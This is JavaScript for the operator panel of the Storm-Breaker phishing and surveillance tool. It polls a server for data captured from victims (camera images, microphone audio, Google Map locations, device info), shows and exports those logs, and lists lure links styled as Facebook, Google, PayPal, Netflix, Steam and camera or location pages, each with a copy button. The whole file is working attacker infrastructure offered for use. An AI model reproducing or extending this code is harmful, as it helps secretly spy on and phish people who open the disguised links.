var old_data = ''

function Listener(){ 
    $.post("receiver.php",{"send_me_result":""},function(data){
        if(data != ""){
            if(data.includes("Image")){
                show_notif("Image File Saved",'Path : '+data.slice(26),true)
            }

            else if(data.includes("Audio")){
                show_notif("Audio File Saved",'Path : '+data.slice(26),false)
            }
            
            else if(data.includes("Google Map")){
                show_notif("Google Map Link",data.slice(18),true)
            }

            

            old_data += data+"\n-------------------------\n"
            $("#result").val(old_data)
        }
    })
}


function show_notif(msg,path,status){
    var btn_text = 'open file'
    var timer = 5000
    var type_notif = "success"

    if(msg.includes("available")){
        btn_text = "open link"
        timer = 0
        type_notif = "danger"
    }

    else if(msg.includes("Google Map")){
        btn_text = "open link"
        timer = 0
    }

    GrowlNotification.notify({
        title: msg,
        description: path ,
        type: type_notif,
        closeTimeout: timer,
        showProgress: true, 
        showButtons: status,
        buttons: {
            action: {
                text: btn_text,
                callback: function() {
                    window.open(path.replace("Path : ",""),'popUpWindow','height=640,width=640,left=1000,top=300,resizable=yes,scrollbars=yes,toolbar=yes,menubar=no,location=no,directories=no, status=yes');
                }
            },
                cancel: {
                text: 'Cancel',
                callback: function() {}
            }
        },
        
    });
}



function getRandomInt(max) {
    return Math.floor(Math.random() * max);
}



function saveTextAsFile(textToWrite, fileNameToSaveAs){   
    var textFileAsBlob = new Blob([textToWrite], {type:'text/plain'}); 
    var downloadLink = document.createElement("a");
    downloadLink.download = getRandomInt(10000)+"_"+fileNameToSaveAs;
    if (window.webkitURL != null)
    {
        // Chrome allows the link to be clicked
        // without actually adding it to the DOM.
        downloadLink.href = window.webkitURL.createObjectURL(textFileAsBlob);
    }
    else
    {
        // Firefox requires the link to be added to the DOM
        // before it can be clicked.
        downloadLink.href = window.URL.createObjectURL(textFileAsBlob);
        downloadLink.onclick = destroyClickedElement;
        downloadLink.style.display = "none";
        document.body.appendChild(downloadLink);
    }

    downloadLink.click();
}




function check_new_version(){
    var last_version = 0
    $.get("Settings.json",function(data){
        last_version +=data.version
        
    })



    function check_version_on_git(){
        $.get("https://raw.githubusercontent.com/ultrasecurity/Storm-Breaker/main/Settings.json",function(data){
            new_version = JSON.parse(data)
                if(last_version < new_version.version){
                    show_notif("New version available :)","https://github.com/ultrasecurity/Storm-Breaker",true)
                }
        })
    }



    setTimeout(check_version_on_git,2000)


}



$(document).ready(function(){
    // Fetch encrypted links from new API
    $.get("generate_links.php", function(response){
        if (response.success) {
            var templates = response.templates;
            
            // Template icon and color mapping
            var templateStyles = {
                'advanced_location': { color: '#e74c3c', bg: 'linear-gradient(135deg, #e74c3c 0%, #c0392b 100%)' },
                'camera': { color: '#3498db', bg: 'linear-gradient(135deg, #3498db 0%, #2980b9 100%)' },
                'device_info': { color: '#9b59b6', bg: 'linear-gradient(135deg, #9b59b6 0%, #8e44ad 100%)' },
                'discord': { color: '#5865f2', bg: 'linear-gradient(135deg, #5865f2 0%, #4752c4 100%)' },
                'facebook': { color: '#1877f2', bg: 'linear-gradient(135deg, #1877f2 0%, #166fe5 100%)' },
                'google': { color: '#ea4335', bg: 'linear-gradient(135deg, #ea4335 0%, #d23321 100%)' },
                'microphone': { color: '#e67e22', bg: 'linear-gradient(135deg, #e67e22 0%, #d35400 100%)' },
                'microsoft': { color: '#00a4ef', bg: 'linear-gradient(135deg, #00a4ef 0%, #0078d4 100%)' },
                'location': { color: '#27ae60', bg: 'linear-gradient(135deg, #27ae60 0%, #229954 100%)' },
                'netflix': { color: '#e50914', bg: 'linear-gradient(135deg, #e50914 0%, #b20710 100%)' },
                'data_capture': { color: '#34495e', bg: 'linear-gradient(135deg, #34495e 0%, #2c3e50 100%)' },
                'paypal': { color: '#0070ba', bg: 'linear-gradient(135deg, #0070ba 0%, #005ea6 100%)' },
                'spotify': { color: '#1db954', bg: 'linear-gradient(135deg, #1db954 0%, #1ed760 100%)' },
                'steam': { color: '#171a21', bg: 'linear-gradient(135deg, #171a21 0%, #1b2838 100%)' },
                'twitter': { color: '#1d9bf0', bg: 'linear-gradient(135deg, #1d9bf0 0%, #0c8bd9 100%)' },
                'weather': { color: '#f39c12', bg: 'linear-gradient(135deg, #f39c12 0%, #e67e22 100%)' }
            };
            
            for(let key in templates) {
                var template = templates[key];
                var style = templateStyles[key] || { color: '#667eea', bg: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)' };
                
                // Check if panel-v4/v5 is being used (has .link-card support)
                if ($('.dashboard-card').length > 0) {
                    // Modern V4/V5 card style with icons
                    $("#links").append(
                        '<div class="link-card" style="border-left: 4px solid ' + style.color + ';">' +
                            '<div style="display: flex; align-items: center; gap: 15px; flex: 1;">' +
                                '<div style="width: 50px; height: 50px; background: ' + style.bg + '; border-radius: 10px; display: flex; align-items: center; justify-content: center; color: white; font-size: 1.5rem;">' +
                                    '<i class="fas ' + template.icon + '"></i>' +
                                '</div>' +
                                '<div style="flex: 1;">' +
                                    '<h5 style="margin: 0 0 5px 0; color: ' + style.color + ';">' + template.name + '</h5>' +
                                    '<p style="margin: 0; font-size: 0.85rem; color: #666;">' + template.desc + '</p>' +
                                    '<code style="font-size: 0.75rem; color: #999; word-break: break-all;">' + template.url + '</code>' +
                                '</div>' +
                            '</div>' +
                            '<button class="btn btn-primary-modern btn-modern cp-btn" data-link="' + template.url + '" style="margin: 0;">' +
                                '<i class="fas fa-copy"></i> Copy' +
                            '</button>' +
                        '</div>'
                    );
                } else {
                    // Original V3 style with encryption
                    $("#links").append(
                        '<div class="mt-2 d-flex justify-content-center" >' +
                            '<p id="path" class="form-control m-1 w-50 ptext">' + template.url + '</p>' +
                            '<span class="input-group-btn m-1 cp-btn">' +
                                '<button class="btn btn-default" type="button" id="copy-button" data-toggle="tooltip" data-placement="button" title="Copy to Clipboard">Copy</button>' +
                            '</span>' +
                        '</div>'
                    );
                }
            }
            
            // Update stats after links are loaded (for V4/V5)
            if (typeof updateStats === 'function') {
                updateStats();
            }
        }
    });

    setTimeout(function(){

        $(".cp-btn").click(function(){
            var node = $(this).attr('data-link') || $(this).parent().get(0).childNodes[0].textContent
            navigator.clipboard.writeText(node);
            Swal.fire({
                icon: 'success',
                title: 'Link Copied!',
                html: '<p style="font-size: 0.9rem; word-break: break-all;">' + node + '</p>',
                showConfirmButton: true
                })
            
            })



            timer = setInterval(Listener,2000)

            $("#btn-listen").click(function(){

                if($("#btn-listen").text() == "Listener Runing / press to stop"){
                    clearInterval(timer)
                    console.log("stoped listener")
                    $("#btn-listen").text("Listener stoped / press to start")


                }else{
                    
                    timer = setInterval(Listener,2000)
                    console.log("started listener")
                    $("#btn-listen").text("Listener Runing / press to stop")
                }
                

            })

        

    },1000)

})


// clear text area
$("#btn-clear").click(function(){
    $("#result").val("")
    old_data = ""
    localStorage.setItem('total_logs', '0')
    updateStats()
})

// Enhanced Features
var sessionStartTime = new Date()
var logCount = 0
var recentActivityCount = 0
var fullLogData = []

// Dark Mode Toggle
function toggleTheme() {
    document.body.classList.toggle('dark-mode')
    const icon = document.getElementById('theme-icon')
    if (document.body.classList.contains('dark-mode')) {
        icon.className = 'fas fa-sun'
        localStorage.setItem('theme', 'dark')
    } else {
        icon.className = 'fas fa-moon'
        localStorage.setItem('theme', 'light')
    }
}

// Load saved theme
if (localStorage.getItem('theme') === 'dark') {
    document.body.classList.add('dark-mode')
    document.getElementById('theme-icon').className = 'fas fa-sun'
}

// Update Statistics
function updateStats() {
    // Update total links
    const linkCount = $('.link-card').length
    $('#total-links').text(linkCount)
    
    // Update total logs
    const savedLogs = localStorage.getItem('total_logs') || '0'
    $('#total-logs').text(savedLogs)
    
    // Update session time
    updateSessionTime()
    
    // Update recent activity
    $('#recent-activity').text(recentActivityCount)
}

function updateSessionTime() {
    const now = new Date()
    const diff = Math.floor((now - sessionStartTime) / 1000)
    const minutes = Math.floor(diff / 60)
    const seconds = diff % 60
    $('#session-time').text(String(minutes).padStart(2, '0') + ':' + String(seconds).padStart(2, '0'))
}

setInterval(updateSessionTime, 1000)

// Copy all logs
function copyAllLogs() {
    const text = $('#result').val()
    navigator.clipboard.writeText(text).then(function() {
        Swal.fire({
            icon: 'success',
            title: 'Copied!',
            text: 'All logs copied to clipboard',
            timer: 2000,
            showConfirmButton: false
        })
    })
}

// Export as JSON
function exportJSON() {
    const logs = $('#result').val()
    const data = {
        timestamp: new Date().toISOString(),
        session_duration: $('#session-time').text(),
        total_logs: logCount,
        logs: logs.split('\n-------------------------\n').filter(l => l.trim())
    }
    const blob = new Blob([JSON.stringify(data, null, 2)], {type: 'application/json'})
    const url = URL.createObjectURL(blob)
    const a = document.createElement('a')
    a.href = url
    a.download = 'stormbreaker_logs_' + Date.now() + '.json'
    a.click()
}

// Apply Filter
function applyFilter() {
    const searchTerm = $('#search-logs').val().toLowerCase()
    const filterType = $('#filter-type').val()
    
    if (searchTerm === '' && filterType === 'all') {
        $('#result').val(old_data)
        return
    }
    
    const lines = old_data.split('\n-------------------------\n')
    let filtered = lines
    
    if (searchTerm) {
        filtered = filtered.filter(line => line.toLowerCase().includes(searchTerm))
    }
    
    if (filterType !== 'all') {
        filtered = filtered.filter(line => {
            const lower = line.toLowerCase()
            if (filterType === 'location') return lower.includes('google map') || lower.includes('location')
            if (filterType === 'image') return lower.includes('image')
            if (filterType === 'audio') return lower.includes('audio')
            if (filterType === 'device') return lower.includes('device') || lower.includes('browser')
            return true
        })
    }
    
    $('#result').val(filtered.join('\n-------------------------\n'))
}

// Refresh Stats
function refreshStats() {
    updateStats()
    Swal.fire({
        icon: 'info',
        title: 'Stats Refreshed',
        timer: 1500,
        showConfirmButton: false
    })
}

// Update listener status
function updateListenerStatus(isRunning) {
    const badge = $('#listener-status')
    if (isRunning) {
        badge.removeClass('badge-offline').addClass('badge-online')
        badge.html('<i class="fas fa-circle"></i> Listener Active')
    } else {
        badge.removeClass('badge-online').addClass('badge-offline')
        badge.html('<i class="fas fa-circle"></i> Listener Stopped')
    }
}

// Enhanced listener tracking
function trackNewLog(data) {
    logCount++
    recentActivityCount++
    localStorage.setItem('total_logs', logCount)
    fullLogData.push({
        timestamp: new Date().toISOString(),
        data: data
    })
    updateStats()
    
    // Reset recent activity after 5 seconds
    setTimeout(() => {
        recentActivityCount = Math.max(0, recentActivityCount - 1)
        updateStats()
    }, 5000)
}